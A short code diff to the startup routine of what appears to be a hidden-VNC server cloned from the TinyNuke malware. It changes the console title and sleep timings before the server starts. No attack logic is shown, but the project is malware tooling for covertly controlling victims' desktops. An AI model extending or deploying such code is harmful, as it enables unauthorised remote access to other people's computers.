@@ -16,12 +16,12 @@ int CALLBACK WinMain(HINSTANCE hInstance,
    freopen("CONOUT$", "w", stdout); 
    freopen("CONOUT$", "w", stderr); 
 
-   SetConsoleTitle(TEXT("hVNC - TinyNuke Knockoff [Melted@HF]"));
+   SetConsoleTitle(TEXT("HVNC - Tinynuke Clone [Melted@HF]"));
   
    printf("[-] Starting hVNC Server...\n");
-   std::this_thread::sleep_for(std::chrono::milliseconds(1050));
+   std::this_thread::sleep_for(std::chrono::milliseconds(700));
    printf("[+] Server Started!\n");
-   std::this_thread::sleep_for(std::chrono::milliseconds(250));
+   std::this_thread::sleep_for(std::chrono::milliseconds(180));
 
    if(!StartServer(atoi(lpCmdLine)))
    {
